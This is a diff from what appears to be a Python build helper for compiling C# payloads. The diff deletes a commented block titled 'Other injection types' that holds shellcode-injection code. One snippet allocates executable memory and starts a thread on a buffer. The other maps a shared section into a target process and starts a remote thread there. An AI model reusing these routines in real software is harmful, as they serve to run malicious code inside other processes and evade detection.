@@ -613,31 +613,3 @@ def cs_compile(filename, flags=""):
   cmd = f"mcs {flags} {filename}"
   os.system(cmd)
   print("Compiled " + filename.replace(".cs",".exe"))
-
-# Other injection types
-#          //  IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
-#          //  Marshal.Copy(buf, 0, addr, buf.Length);
-#          //  IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-#          //  WaitForSingleObject(hThread, 0xFFFFFFFF);
-#
-#
-#          //SIZE_T size = 4096;
-#          //LARGE_INTEGER sectionSize = {{ size }};
-#          //HANDLE sectionHandle = NULL;
-#          //PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
-#          //
-#          //// create a memory section
-#          //NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
-#          //
-#          //// create a view of the memory section in the local process
-#          //NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
-#
-#          //// create a view of the memory section in the target process
-#          //HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, 1480);
-#          //NtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
-#
-#          //// copy shellcode to the local view, which will get reflected in the target process's mapped view
-#          //memcpy(localSectionAddress, buf, sizeof(buf));
-#          //
-#          //HANDLE targetThreadHandle = NULL;
-#          //RtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
